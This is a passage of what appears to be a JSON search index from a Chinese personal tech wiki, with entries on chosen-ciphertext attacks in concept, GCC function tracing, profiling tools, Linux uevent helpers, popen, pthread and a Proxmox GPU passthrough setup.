Gamal密码系统在选择明文攻击下在语义上是安全的，但是这种语义安全性在选择密文攻击下可以轻易地失败。SSL协议中使用的早期版本的RSA填充容易受到复杂的自适应选择密文攻击，该攻击揭示了SSL会话密钥。选择密文攻击对一些自同步流密码也有影响。防篡改加密智能卡的设计者 必须特别认识到这些攻击，因为这些设备可能完全处于对手的控制之下，对手可以发出大量选择的密文以试图恢复隐藏的密钥。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"隐写术","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/信息安全/隐写术/","text":"利用信道的冗余信道容量必须大于“表面上”负载信息的需求，剩下的就是冗余。 例如数字图像，采样过程中引入的噪声，就是一类冗余，可以将信息藏在里面；有损压缩技术（如JPEG）也会在解压的数据中引入一些误差，可以将信息藏里面。 但往往隐写术不具有良好的鲁棒性，当图像被稍微修改后，隐入的消息就无法提取校验了。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"可视化相关工具","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/数据分析/可视化相关工具/","text":"无需编程tableau：业界常用的数据分析工具，操作简单 https://www.tableau.com/ 适合临时做PPT图表的工具： https://www.datawrapper.de/ 生成比较偏门的开源图表工具（可编程实现自定义图表）： https://app.rawgraphs.io/ 编程实现可视化D3: Bring data to life with SVG, Canvas and HTML https://github.com/tianxuzhang/d3.v4-API-Translation#timers","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"数据分析","slug":"计算机/数据分析","permalink":"http://wiki.noodlefighter.com/categories/计算机/数据分析/"}]},{"title":"gcc下记录函数进入退出","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/编程/C/gcc下记录函数进入退出/","text":"参考： https://gcc.gnu.org/onlinedocs/gcc-4.5.1/gcc/Code-Gen-Options.html#index-finstrument_002dfunctions-2114 https://mcuoneclipse.com/2015/04/04/poor-mans-trace-free-of-charge-function-entryexit-trace-with-gnu-tools/ http://michael.hinespot.com/tutorials/gcc_trace_functions 加入-finstrument-functions后发生段错误的问题定位到调用__cyg_profile_func_enter 时发生segmentation error，发现调用了，加入参数排除掉实现这函数的源文件即可： 1-finstrument-functions-exclude-file-list=trace.c 或者给符号加__attribute__ ((no_instrument_function))也能解决。 Trace and profile function calls with GCC via:https://balau82.wordpress.com/2010/10/06/trace-and-profile-function-calls-with-gcc/ Software debugging is a complex task. There is always the need to collect all available information, in order to detect and understand the problem fast and to think of a proper solution. Sometimes it’s more convenient to debug step-by-step, sometimes it’s better to make the program run completely, and then trace the execution flow “offline”. Another important step in software development is profiling. GNU offers “gprof” as a tool to analyze the execution time of functions. The working principle of gprof is that it polls the program state with a small sampling interval and notes the function that is executing. In this case small functions could also not appear in the profiling data because their execution time is smaller than an interval. I recently tried to use a feature of GNU GCC that can be of some help both for tracing and for profiling. It’s the following option (from its GNU GCC Manual section): -finstrument-functions Generate instrumentation calls for entry and exit to functions. Just after function entry and just before function exit, the following profiling functions will be called with the address of the current function and its call site. void __cyg_profile_func_enter (void this_fn, void call_site); void cyg_profile_func_exit (void this_fn, void call_site); The execution flow can be traced implementing these monitoring points, for example writing on file some useful information. Suppose you have to analyze the following code: 123456789101112#include void foo() { printf(\"foo\\n\");}int main() { foo(); return 0;} Create a file called “trace.c” with the following content: 123456789101112131415161718192021222324252627282930313233343536#include #include static FILE *fp_trace;void__attribute__ ((constructor))trace_begin (void){ fp_trace = fopen(\"trace.out\", \"w\");}void__attribute__ ((destructor))trace_end (void){ if(fp_trace != NULL) { fclose(fp_trace); }}void__cyg_profile_func_enter (void *func, void *caller){ if(fp_trace != NULL) { fprintf(fp_trace, \"e %p %p %lu\\n\", func, caller, time(NULL) ); }}void__cyg_profile_func_exit (void *func, void *caller){ if(fp_trace != NULL) { fprintf(fp_trace, \"x %p %p %lu\\n\", func, caller, time(NULL)); }} The idea is to write into a log (in our case “trace.out“) the function addresses, the address of the call and the execution time. To do so, a file needs to be open at the beginning of execution. The GCC-specific attribute “constructor” helps in defining a function that is executed before “main”. In the same way the attribute “destructor” specifies that a function must be executed when the program is going to exit. To compile and execute the program, the command-line is: 12345678910$ gcc -finstrument-functions -g -c -o main.o main.c$ gcc -c -o trace.o trace.c$ gcc main.o trace.o -o main$ ./mainfoo$ cat trace.oute 0x400679 0x394281c40b 1286372153e 0x400648 0x40069a 1286372153x 0x400648 0x40069a 1286372153x 0x400679 0x394281c40b 1286372153 To understand the addresses, the “addr2line” tool can be used: it’s a tool included in “binutils” package that, given an executable with debug information, maps an execution address to a source code file and line. I put together an executable shell script (“readtracelog.sh“) that uses addr2line to print the trace log into a readable format: 123456789101112131415161718192021222324252627#!/bin/shif test ! -f \"$1\"then echo \"Error: executable $1 does not exist.\" exit 1fiif test ! -f \"$2\"then echo \"Error: trace log $2 does not exist.\" exit 1fiEXECUTABLE=\"$1\"TRACELOG=\"$2\"while read LINETYPE FADDR CADDR CTIME; do FNAME=\"$(addr2line -f -e ${EXECUTABLE} ${FADDR}|head -1)\" CDATE=\"$(date -Iseconds -d @${CTIME})\" if test \"${LINETYPE}\" = \"e\" then CNAME=\"$(addr2line -f -e ${EXECUTABLE} ${CADDR}|head -1)\" CLINE=\"$(addr2line -s -e ${EXECUTABLE} ${CADDR})\" echo \"Enter ${FNAME} at ${CDATE}, called from ${CNAME} (${CLINE})\" fi if test \"${LINETYPE}\" = \"x\" then echo \"Exit ${FNAME} at ${CDATE}\" fidone < \"${TRACELOG}\" Testing the script with the previous output, the result is: 12345$ ./readtracelog.sh main trace.outEnter main at 2010-10-06T15:35:53+0200, called from ?? (??:0)Enter foo at 2010-10-06T15:35:53+0200, called from main (main.c:9)Exit foo at 2010-10-06T15:35:53+0200Exit main at 2010-10-06T15:35:53+0200 The “??” symbol indicates that addr2line has no debug information on that address: in fact it should belong to C runtime libraries that initialize the program and call the main function. In this case the execution time was very small (less than a second) but in more complex scenarios the execution time can be useful to detect where the application spends the most time. It is also a good idea to use the most precise timer on the system, such as gettimeofday in Linux that returns also fractions of a second. Some thoughts for embedded platforms: It is possible to have fine-grain timing information if the platform contains an internal hardware timer, counting even single clock cycles. It will become then important to reduce the overhead of the entry and exit functions to measure the real function execution time. The trace information can be sent to the serial port (for example in binary form), and then interpreted by a program running on PC. The entry and exit functions can be used to monitor also the state of other hardware peripherals, such as a temperature sensor.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"程序性能分析","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/编程/程序性能分析/","text":"TODO 火焰图参考： https://blog.csdn.net/gatieme/article/details/78885908 https://github.com/brendangregg/FlameGraphhttps://github.com/brendangregg/FlameGraph/blob/master/example-dtrace-stacks.txthttp://www.brendangregg.com/flamegraphs.html 火焰图就是通过定时采样堆栈信息，生成“时间占比-堆栈层次”的图表，通过观察函数执行时间占比（越宽占用时间越长）、CPU使用程度（颜色越深吃的CPU资源越多）来调优程序性能，“平顶山”式的图形一般就是要优化的地方。 局限性：由于原理是定时采样，信息是不完整的，无法观察到调用过深的情况；只适合观察同步阻塞，而通过异步实现的延迟无法观察。 用perf捕捉堆栈信息程序编译时应使用-Og -g。 1# perf record -F 99 -p -g 简单看看采集到的东西，但数据一多就没法看了： 1# perf report -n --stdio 用FlameGraph生成火焰图安装：b 1yay -S flamegraph 生成： 1# perf script | stackcollapse-perf.pl | flamegraph.pl > process.svg uftrace能记录函数进出信息和对应时标，能很方便地分析函数执行时间、频率等。 入侵式的分析，所以相较于perf能拿到完整、准确的log，而不是简单采样看看哪个函数占总时间的多，但要注意它会影响时序。 自带一个文字UI；带有可选依赖能支持完全动态调试，无需重新编译源码插入-gp选项；丰富的筛选功能，十分用户友好。 快速上手：https://uftrace.github.io/slide 基本用法： 123$ make -gp -g abc.c$ uftrace record ./a.out$ uftrace replay 常用选项： 1234# 可控制打印的项目，可用项可以去`https://github.com/namhyung/uftrace/blob/master/doc/uftrace-live.md`的FIELDS里找-f time# 过滤函数 gprof官方文档：https://sourceware.org/binutils/docs-2.32/gprof/index.html 用gprof和oprofile来分析 linux程序的性能 via: https://www.cnblogs.com/StitchSun/articles/4286428.html gprof是GNU工具之一，它在编译的时候在每个函数的出入口加入了profiling的代码，运行时统计程序在用户态的 执行信息，可以得到每个函数的调用次数，执行时间，调用关系等信息，简单易懂。适合于查找用户级程序的性能瓶颈，对于很多时间都在内核态执行的程 序，gprof不适合。 oprofile也是一个开源的profiling工具，它使用硬件调试寄存器来统计信息，进 行profiling的开销比较小，而且可以对内核进行profiling。它统计的信息非常的多，可以得到cache的缺失率，memory的访存信 息，分支预测错误率等等，这些信息gprof是得不到的，但是对于函数调用次数，它是不能够得到的。。 简单来说，gprof简单，适合于查找用户级程序的瓶颈，而oprofile稍显复杂，但是得到的信息更多，更适合调试系统软件。 gprof原理与缺陷 via: https://pli53.wordpress.com/2011/01/23/gprof%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%BA%E9%99%B7/ 在gprof出现之前，Unix系统中已经有类似的工具prof，记录每个函数的执行次数和时间。prof的缺点是没有记录函数调用关系，例如A函数调用了B函数，A执行了10次，用时1毫秒，B执行了20次，用时2毫秒，在prof中返回的数据就是A执行10次1毫秒，B执行20次2毫秒，没有把B的执行时间加入到A中，导致在实际应用中，各个函数的执行时间都差不多，很难发现瓶颈。另一个问题是，如果C函数也调用了B函数并且B执行了100次，那么就不知道这100次中A和C分别调用了多少次。 gprof对prof的主要改进就是加入对函数动态调用关系的分析和记录，将子函数的执行时间加入到父函数中。例如在以上例子中，gprof返回的结果将是A用时3毫秒B用时2毫秒。概括起来说，gprof在被评测程序的每个函数运行前插入评测程序，记录以下三类程序运行数据： 函数运行次数。 函数执行时间。在分时操作系统中，用函数开始时间和结束时间的差作为执行时间不准确，因为这段时间内该函数并不独占CPU. 为了解决这个问题，prof和gprof都采用了采样的方法，即每隔一段时间就对程序计数器（PC）进行采样，根据多少个采样点落入该函数的PC范围来估算实际执行时间。 函数调用关系。函数调用关系包括动态调用关系和静态调用关系，前者是运行时决定，后者是由源代码决定的。gprof主要使用动态调用关系，辅以静态关系。在取得了动态函数调用关系图之后，在分析函数运行时间时，将子函数的运行时间加入到父函数中。 简单介绍了其原理后，再说一下gprof的主要缺陷： 函数执行时间是估计值。如前所说，函数执行时间是通过采样估算的。这个不是什么大的问题，一般估算值与实际值相差不大，何况任何测量都不可能100%准确。 gprof假设一个函数的每次执行时间是相同的。这个假设在实际中可能并不成立，例如，如果函数B执行100次，总运行时间时间10毫秒，被A调用20次，被C调用80次，那么B的10毫秒中有2毫秒加入到A的执行时间，8毫秒加入到C的执行时间中。实际上，很可能B被A调用时的每次执行时间和被C调用时的每次执行时间相差很大，所以以上分摊并不准确，但gprof无法做出区分。 不适合存在大量递归调用的程序。如果存在递归调用时，函数动态调用关系图中将存在有向环，这样明显不能将子函数的运行时间加到其父函数中，否则环将导致这个累加过程无限循环下去。gprof对此的解决办法是用强连通分量（strongly-connected components）将这些递归调用的函数在调用关系图中坍缩成一个节点来处理，但在显示最终结果时仍然分别显示各个函数的运行时间。缺点是，对于这些递归调用的函数，其执行时间不包括其子函数的执行时间，如prof一样。所以当程序中存在大量递归调用时，gprof退化为老的prof工具。 不能处理内联函数。由于gprof只记载函数调用，如果程序员用大量内联函数的话，将不能被gprof发现。 数据表示不直观。gprof将结果输出到二维的终端中，因此对于树状结构的表示不够直观。当然这不是大问题，习惯了就行。 对于2和3，后来出现的程序性能评测工具有改进方案，那就是不仅记录程序调用关系图，而且记录程序调用栈。这样做的话增加了工具的运行负荷，因此需要降低采样频率来保证工具的性能。 Tutorial: Using GNU profiling gprof with ARM Cortex-M via: https://mcuoneclipse.com/2015/08/23/tutorial-using-gnu-profiling-gprof-with-arm-cortex-m/ 这篇文章描述了如何在交叉编译环境下使用buildutils里的gprof——半主机模式。 Windows的性能监控工具xperf via:https://www.jianshu.com/p/2304c3059c28 Xperf是一款系统级工具，是产品套件Windows性能工具包（Windows Performance Toolkit，WPT)的一部分，而WPT则属于微软软件开发包（Microsoft Software Development Kit，SDK)。Xperf是Windows事件跟踪系统（Event Tracing for Windows，ETW）的补充。ETW则是服务器操作系统的一个内置组件，提供详细的系统性能和系统数据。补充：WPT包含三款工具（xperf、xperfview、GPU）：Xperf：使用CMD命令行工作。包括性能监控开始，收集，和打开等。XperfView：这是为Xperf的采样文件可视化显示的工具，可以绘制各种资源使用曲线，并用任意方式组织数据，排序。 https://blogs.msdn.microsoft.com/ntdebugging/2008/04/03/windows-performance-toolkit-xperf/ http://windowsitpro.com/windows-server/q-where-can-i-download-xperf-and-xperfview-toolshttp://msdn.microsoft.com/en-us/windowsserver/bb980924.aspx","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"uevent","date":"2019-07-14T00:00:00.000Z","path":"wiki/计算机/linux/kernel/uevent/","text":"从hotplug说起busybox上的mdev是用sysfs写入需要触发时执行的程序的方式实现的hotplug. 这是mdev的启动脚本/etc/init.d/S10mdev, 开机时给内核传入自身路径. 12345678910111213141516171819#!/bin/sh## Start mdev....#case \"$1\" in start) echo \"Starting mdev...\" echo /sbin/mdev >/proc/sys/kernel/hotplug /sbin/mdev -s # coldplug modules find /sys/ -name modalias -print0 | xargs -0 sort -u | tr '\\n' '\\0' | \\ xargs -0 modprobe -abq ;; stop) ;; restart|reload) ;;... 根据linux的文档： 123456789Kernel Hotplug Helper (/sbin/hotplug)There is a kernel parameter: /proc/sys/kernel/hotplug, which normally holds the pathname /sbin/hotplug. That parameter names a program which the kernel may invoke at various times.The /sbin/hotplug program can be invoked by any subsystem as part of its reaction to a configuration change, from a thread in that subsystem. Only one parameter is required: the name of a subsystem being notified of some kernel event. That name is used as the first key for further event dispatch; any other argument and environment parameters are specified by the subsystem making that invocation.Hotplug software and other resources is available at:http://linux-hotplug.sourceforge.netMailing list information is also available at that site. 可见早些年的linux发行版，使用的是一个叫hotplug的uevent_helper。 TODO: uevent编写参考: https://www.cnblogs.com/fastwave2004/articles/4320725.html https://blog.csdn.net/W1107101310/article/details/80211885","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"linux_userspace_api","date":"2019-07-11T00:00:00.000Z","path":"wiki/计算机/linux/kernel/linux-userspace-api/","text":"有时候需要在内核态执行用户态应用，提供了一套usermode-helper API。 参考： https://developer.ibm.com/articles/l-user-space-apps/ 参考：linux里的UEVENT_HELPER机制在linux kernel的Kconfig里有两个配置：CONFIG_UEVENT_HELPER和CONFIG_UEVENT_HELPER_PATH，前者确定是否开启功能，后者指定路径，功能是当hotplug发生时执行这个路径对应的用户空间的脚本（程序）。 这个路径也可以在运行期间通过写入/proc/sys/kernel/hotplug或者/sys/kernel/uevent_helper来动态修改。 以下是Kconfig里的说明： 12345678910111213141516171819202122config UEVENT_HELPER bool \"Support for uevent helper\" help The uevent helper program is forked by the kernel for every uevent. Before the switch to the netlink-based uevent source, this was used to hook hotplug scripts into kernel device events. It usually pointed to a shell script at /sbin/hotplug. This should not be used today, because usual systems create many events at bootup or device discovery in a very short time frame. One forked process per event can create so many processes that it creates a high system load, or on smaller systems it is known to create out-of-memory situations during bootup.config UEVENT_HELPER_PATH string \"path to uevent helper\" depends on UEVENT_HELPER default \"\" help To disable user space helper program execution at by default specify an empty string here. This setting can still be altered via /proc/sys/kernel/hotplug or via /sys/kernel/uevent_helper 以下是相关实现，github传送门： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384......#ifdef CONFIG_UEVENT_HELPERchar uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;#endif......#ifdef CONFIG_UEVENT_HELPERstatic int kobj_usermode_filter(struct kobject *kobj){ const struct kobj_ns_type_operations *ops; ops = kobj_ns_ops(kobj); if (ops) { const void *init_ns, *ns; ns = kobj->ktype->namespace(kobj); init_ns = ops->initial_ns(); return ns != init_ns; } return 0;}static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem){ int len; len = strlcpy(&env->buf[env->buflen], subsystem, sizeof(env->buf) - env->buflen); if (len >= (sizeof(env->buf) - env->buflen)) { WARN(1, KERN_ERR \"init_uevent_argv: buffer size too small\\n\"); return -ENOMEM; } env->argv[0] = uevent_helper; env->argv[1] = &env->buf[env->buflen]; env->argv[2] = NULL; env->buflen += len + 1; return 0;}static void cleanup_uevent_env(struct subprocess_info *info){ kfree(info->data);}#endif......int kobject_uevent_env(struct kobject *kobj, enum kobject_action action, char *envp_ext[]){......#ifdef CONFIG_UEVENT_HELPER /* call uevent_helper, usually only enabled during early boot */ if (uevent_helper[0] && !kobj_usermode_filter(kobj)) { struct subprocess_info *info; retval = add_uevent_var(env, \"HOME=/\"); if (retval) goto exit; retval = add_uevent_var(env, \"PATH=/sbin:/bin:/usr/sbin:/usr/bin\"); if (retval) goto exit; retval = init_uevent_argv(env, subsystem); if (retval) goto exit; retval = -ENOMEM; info = call_usermodehelper_setup(env->argv[0], env->argv, env->envp, GFP_KERNEL, NULL, cleanup_uevent_env, env); if (info) { retval = call_usermodehelper_exec(info, UMH_NO_WAIT); env = NULL; /* freed by cleanup_uevent_env */ } }#endif......}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"windows的IOCP模型","date":"2019-07-09T00:00:00.000Z","path":"wiki/计算机/windows/windows的iocp模型/","text":"linux上有epoll做高并发，看到了这篇关于异步事件驱动库的文章：https://blog.csdn.net/lijinqi1987/article/details/71214974 发现libev在windows上的实现用的是一种叫IOCP的接口，应该能同linux的epoll类比。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"windows","slug":"计算机/windows","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/"}]},{"title":"c语言字符串处理","date":"2019-07-09T00:00:00.000Z","path":"wiki/计算机/编程/C/c语言字符串处理/","text":"字符串匹配12#include char *strstr(const char *haystack, const char *needle); 返回匹配到的子串，匹配不到返回NULL；当needle为NULL时直接返回haystatck。 字符串转数字strtol123#include long int strtol(const char *nptr, char **endptr, int base);long long int strtoll(const char *nptr, char **endptr, int base); 例： 12const char *str = \"\";int n = strol(); C语言字符串操作大全 via: https://www.cnblogs.com/lidabo/p/5225868.html 1）字符串操作 strcpy(p, p1) 复制字符串strncpy(p, p1, n) 复制指定长度字符串strcat(p, p1) 附加字符串strncat(p, p1, n) 附加指定长度字符串strlen(p) 取字符串长度strcmp(p, p1) 比较字符串strcasecmp忽略大小写比较字符串strncmp(p, p1, n) 比较指定长度字符串strchr(p, c) 在字符串中查找指定字符strrchr(p, c) 在字符串中反向查找strstr(p, p1) 查找字符串strpbrk(p, p1) 以目标字符串的所有字符作为集合，在当前字符串查找该集合的任一元素strspn(p, p1) 以目标字符串的所有字符作为集合，在当前字符串查找不属于该集合的任一元素的偏移strcspn(p, p1) 以目标字符串的所有字符作为集合，在当前字符串查找属于该集合的任一元素的偏移* 具有指定长度的字符串处理函数在已处理的字符串之后填补零结尾符 2）字符串到数值类型的转换 strtod(p, ppend) 从字符串 p 中转换 double 类型数值，并将后续的字符串指针存储到 ppend 指向的 char* 类型存储。strtol(p, ppend, base) 从字符串 p 中转换 long 类型整型数值，base 显式设置转换的整型进制，设置为 0 以根据特定格式判断所用进制，0x, 0X 前缀以解释为十六进制格式整型，0 前缀以解释为八进制格式整型atoi(p) 字符串转换到 int 整型atof(p) 字符串转换到 double 符点数atol(p) 字符串转换到 long 整型 3）字符检查 isalpha() 检查是否为字母字符isupper() 检查是否为大写字母字符islower() 检查是否为小写字母字符isdigit() 检查是否为数字isxdigit() 检查是否为十六进制数字表示的有效字符isspace() 检查是否为空格类型字符iscntrl() 检查是否为控制字符ispunct() 检查是否为标点符号isalnum() 检查是否为字母和数字isprint() 检查是否是可打印字符isgraph() 检查是否是图形字符，等效于 isalnum() | ispunct() 4）函数原型原型：strcpy(char destination[], const char source[]); 功能：将字符串source拷贝到字符串destination中例程： #include #include void main(void){ char str1[10] = { “TsinghuaOK”}; char str2[10] = { “Computer”}; cout","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"popen","date":"2019-07-09T00:00:00.000Z","path":"wiki/计算机/编程/C/popen/","text":"介绍 via: https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.bpxbd00/rpopen.htm 原型123#include FILE *popen(const char *command, const char *mode);int pclose(FILE *stream); 一般性描述popen（）函数执行string命令指定的命令。它在调用程序和执行的命令之间创建一个管道，并返回一个指向流的指针，该流可用于读取或写入管道。 执行命令的环境就像使用fork（）在popen（）调用中创建子进程一样，并且子进程调用了sh实用程序： 1execl(\"/bin/sh\", \"sh\", \"-c\", command, (char *)0); popen（）函数确保在子进程中关闭在父进程中保持打开的先前popen（）调用的任何流。 popen（）的mode参数是一个指定I / O模式的字符串： 如果mode为r，则文件描述符STDOUT_FILENO将在子进程启动时成为管道的可写端。调用进程中的文件描述符fileno（stream），其中stream是popen（）返回的流指针，将是管道的可读端。 如果mode是w，则文件描述符STDIN_FILENO将在子进程启动时成为管道的可读端。调用进程中的文件描述符fileno（stream），其中stream是popen（）返回的流指针，将是管道的可写端。 如果mode是任何其他值，则返回NULL指针，并将errno设置为EINVAL。 在popen（）之后，父进程和子进程都能够在终止之前独立执行。 由于共享打开文件，因此模式r命令可用作输入过滤器，模式w命令可用作输出过滤器。 在打开输入过滤器之前（即，在popen（）之前）进行缓冲读取可能会使该过滤器的标准输入位置错误。使用fflush（）缓冲区刷新可以防止输出滤波器出现类似问题。 用popen（）打开的流应该由pclose（）关闭。 popen（）的行为是针对r和w的模式的值指定的。支持rb和wb的模式值，但不可移植。 如果无法执行shell命令，则pclose（）返回的子终止状态就像使用exit（127）或_exit（127）终止shell命令一样。 如果应用程序使用pid参数大于0调用waitpid（），并且它仍然具有使用popen（）打开创建的流，则必须确保pid不引用popen（）启动的进程 popen（）返回的流将被指定为面向字节的。 文件标记和转换的特殊行为：当指定FILETAG（，AUTOTAG）运行时选项时，由popen（）打开的父进程和子进程之间的通信管道将在第一个I /上用编写器的程序CCSID标记O.例如，如果指定了popen（some_command，“r”），那么popen（）返回的流将在子进程的程序CCSID中标记。 返回值如果成功，popen（）返回一个指向打开流的指针，该指针可用于读取或写入管道。 如果不成功，popen（）返回NULL指针并将errno设置为以下值之一：EINVAL：The mode argument is invalid. popen() may also set errno values as described by spawn(), fork(), or pipe(). pclose通过pclose()获取执行结果（需要#include ）： 12345rv = pclose(pp);printf(\"ifexited: %d\\n\", WIFEXITED(rv));if (WIFEXITED(rv)) { printf(\"subprocess exited, exit code: %d\\n\", WEXITSTATUS(rv));} 一例：popen获取系统命令的输出内容12345678fp = popen(\"top -n 1\", \"r\");if(NULL != fp) { fgets(topline[0], 256, fp); fgets(topline[1], 256, fp); pclose(fp);} else { printf(\"command failed!\\n\");}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"pthread","date":"2019-07-09T00:00:00.000Z","path":"wiki/计算机/编程/C/pthread/","text":"TODO: https://randu.org/tutorials/threads/ TODO: https://randu.org/tutorials/threads/ 简单使用12pthread_t thread;pthread_create(&thread, NULL, thr_func, NULL); thr_func返回时，pthread仍保留着线程资源和返回值，直到使用pthread_join取走返回值并释放资源。 同步mutex 互斥锁简单的锁, 常用. rwlock读写锁仅在“并行读的次数远远大于写的次数”且“读占用时需要较多cpu时间”的场景使用. 因为rwlock的实现需要做更多的逻辑, 效率比简单的mutex差, 仅在满足上述条件的少数情况有使用的必要. 错误错误11Assertion `mutex->__data.__owner == 0' failed https://blog.csdn.net/luckyapple1028/article/details/51588946 错误21__pthread_mutex_lock_full: Assertion `INTERNAL_SYSCALL_ERRNO (e, __err) != ESRCH || !robust' failed","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"proxmox显卡直通","date":"2019-07-08T00:00:00.000Z","path":"wiki/计算机/虚拟技术/proxmox显卡直通/","text":"打算利用虚拟化平台做双系统桌面环境，作娱乐、开发一体的主机。 折腾了几天proxmox显卡直通，linux那按照官方的wiki里的方法直接能用，但win安装显卡驱动始终是（code: 43）。 直接dump bios rom的方法一直没成功，rom-paser发现是坏的。直到看到了下面的参考文章，提出了其他的dump方式。 我的机器情况： 12Intel E3-1230v2Nvidia GTX750 成功的配置123/usr/bin/kvm -id 101 -name r-win-home -chardev socket,id=qmp,path=/var/run/qemu-server/101.qmp,server,nowait -mon chardev=qmp,mode=control -chardev socket,id=qmp-event,path=/var/run/qmeventd.sock,reconnect=5 -mon chardev=qmp-event,mode=control -pidfile /var/run/qemu-server/101.pid -daemonize -smbios type=1,uuid=99242359-1d91-4bc7-aa21-22c43f343590 -drive if=pflash,unit=0,format=raw,readonly,file=/usr/share/pve-edk2-firmware//OVMF_CODE.fd -drive if=pflash,unit=1,format=raw,id=drive-efidisk0,file=/tmp/101-ovmf.fd -smp 8,sockets=1,cores=8,maxcpus=8 -nodefaults -boot menu=on,strict=on,reboot-timeout=1000,splash=/usr/share/qemu-server/bootsplash.jpg -vnc unix:/var/run/qemu-server/101.vnc,x509,password -no-hpet -cpu kvm64,+lahf_lm,+sep,+kvm_pv_unhalt,+kvm_pv_eoi,hv_vendor_id=proxmox,hv_spinlocks=0x1fff,hv_vapic,hv_time,hv_reset,hv_vpindex,hv_runtime,hv_relaxed,hv_synic,hv_stimer,enforce,kvm=off -m 8192 -device vmgenid,guid=94140d79-7ee3-414f-9e09-7394e7785f97 -readconfig /usr/share/qemu-server/pve-q35.cfg -device nec-usb-xhci,id=xhci,bus=pci.1,addr=0x1b -device vfio-pci,host=01:00.0,id=hostpci0,bus=ich9-pcie-port-1,addr=0x0,romfile=/usr/share/kvm/gtx750.rom -device vfio-pci,host=00:1a.0,id=hostpci1,bus=ich9-pcie-port-2,addr=0x0 -device usb-host,bus=xhci.0,hostbus=4,hostport=1,id=usb2 -chardev spicevmc,id=usbredirchardev3,name=usbredir -device usb-redir,chardev=usbredirchardev3,id=usbredirdev3,bus=ehci.0 -device qxl-vga,id=vga,bus=pcie.0,addr=0x1 -spice tls-port=61000,addr=127.0.0.1,tls-ciphers=HIGH,seamless-migration=on -device virtio-serial,id=spice,bus=pci.0,addr=0x9 -chardev spicevmc,id=vdagent,name=vdagent -device virtserialport,chardev=vdagent,name=com.redhat.spice.0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x3 -iscsi initiator-name=iqn.1993-08.org.debian:01:373ed23ccfe4 -drive file=/var/lib/vz/template/iso/virtio-win-0.1.171.iso,if=none,id=drive-ide2,media=cdrom,aio=threads -device ide-cd,bus=ide.1,unit=0,drive=drive-ide2,id=ide2,bootindex=200 -drive file=/dev/ssd/vm-101-disk-0,if=none,id=drive-virtio0,format=raw,cache=none,aio=native,detect-zeroes=on -device virtio-blk-pci,drive=drive-virtio0,id=virtio0,bus=pci.0,addr=0xa,bootindex=100 -drive file=/dev/sda,if=none,id=drive-virtio1,format=raw,cache=none,aio=native,detect-zeroes=on -device virtio-blk-pci,drive=drive-virtio1,id=virtio1,bus=pci.0,addr=0xb -netdev type=tap,id=net0,ifname=tap101i0,script=/var/lib/qemu-server/pve-bridge,downscript=/var/lib/qemu-server/pve-bridgedown -device e1000,mac=82:5B:E9:79:60:23,netdev=net0,bus=pci.0,addr=0x12,id=net0,bootindex=300 -rtc driftfix=slew,base=localtime -machine type=q35 -global kvm-pit.lost_tick_policy=discard 参考： https://forums.unraid.net/topic/41951-gpu-passthrough-with-only-one-card/ 